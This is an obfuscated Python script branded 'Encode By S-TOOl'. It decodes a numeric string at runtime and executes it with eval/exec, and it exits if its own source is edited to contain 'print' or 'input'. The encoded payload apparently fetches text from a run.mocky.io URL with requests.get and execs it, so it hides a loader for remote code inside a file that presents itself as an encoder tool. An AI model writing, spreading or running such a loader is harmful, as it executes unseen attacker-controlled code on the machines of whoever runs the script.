# Encode By S-TOOl
# Description: Thanh Dat
class Enpypro():
 def __init__(self:object,_bit:bool=False,_eval:int=0,*_byte:bool,**_rasputin:bool)->exec:
  self._exec,self._decode,self._exit,self._bytes,_rasputin[_eval],_bit=lambda _bits:_bit(_bits),exit()if _bit else'abcdefghijklmnopqrstuvwxyz0123456789',lambda _bit:str(_rasputin[_eval](f"{self._decode[4]+self._decode[-13]+self._decode[4]+self._decode[2]}(''.join(%s),{self._decode[6]+self._decode[11]+self._decode[14]+self._decode[1]+self._decode[0]+self._decode[11]+self._decode[18]}())"%list(_bit))).encode(self._decode[20]+self._decode[19]+self._decode[5]+self._decode[34])if _rasputin[_eval]==eval else exit(),lambda _encode:"".join(chr(int(_boom)-len(_encode.split('=')))if _boom!='¤'else'ζ'for _boom in str(_encode).split('=')),eval,lambda _bit:exit()if self._decode[15]+self._decode[17]+self._decode[8]+self._decode[13]+self._decode[19] in open(__file__, errors=self._decode[8]+self._decode[6]+self._decode[13]+self._decode[14]+self._decode[17]+self._decode[4]).read() or self._decode[8]+self._decode[13]+self._decode[15]+self._decode[20]+self._decode[19] in open(__file__, errors=self._decode[8]+self._decode[6]+self._decode[13]+self._decode[14]+self._decode[17]+self._decode[4]).read()else"".join(_bit if _bit not in self._decode else self._decode[self._decode.index(_bit)+1 if self._decode.index(_bit)+1<len(self._decode)else 0]for _bit in "".join(chr(ord(t)-790008)if t!="ζ"else"\n"for t in self._bytes(_bit)))
  return self.__decode__(_rasputin[(self._decode[-1]+'_')[-1]+self._decode[18]+self._decode[15]+self._decode[0]+self._decode[17]+self._decode[10]+self._decode[11]+self._decode[4]])
 def __decode__(self,_execute: str)->exec:return(None,self._exit(self._exec(_execute)))[0]
Enpypro(_bit=False,_sparkle='''790366=790370=790373=790372=790375=790377=790294=790372=790376=¤=790376=790377=790377=790294=790323=790294=790372=790373=790362=790371=790302=790372=790376=790308=790373=790319=790377=790365=790308=790359=790319=790376=790362=790371=790319=790370=790362=790302=790357=790357=790363=790366=790369=790362=790357=790357=790303=790303=790308=790375=790362=790319=790361=790302=790303=790308=790375=790366=790371=790361=790362=790381=790302=790301=790297=790294=790331=790371=790360=790372=790361=790362=790294=790328=790382=790294=790345=790307=790346=790341=790341=790369=790301=790303=¤=790366=790363=790294=790376=790377=790377=790294=790323=790323=790294=790301=790301=790320=¤=790271=790373=790375=790366=790371=790377=790294=790302=790296=790354=790384=790312=790312=790353=790310=790321=790312=790310=790370=790294=790332=790366=790369=790362=790294=790534=790489=790294=790328=798145=790294=790331=790361=790366=790377=790308=790294=790294=790294=790294=790296=790303=¤=790271=790374=790378=790366=790377=790302=790303=¤=790366=790370=790373=790372=790375=790377=790294=790375=790362=790374=790378=790362=790376=790377=790376=790321=790362=790381=790362=790360=790302=790375=790362=790374=790378=790362=790376=790377=790376=790308=790364=790362=790377=790302=790301=790365=790377=790377=790373=790376=790320=790309=790309=790375=790378=790371=790308=790370=790372=790360=790368=790382=790308=790366=790372=790309=790379=790312=790309=790361=790312=790363=790315=790316=790312=790313=790318=790307=790316=790360=790361=790359=790307=790313=790319=790317=790361=790307=790318=790384=790319=790313=790307=790319=790318=790312=790318=790384=790319=790317=790316=790361=790312=790314=790361=790301=790303=790308=790377=790362=790381=790377=790303=¤''')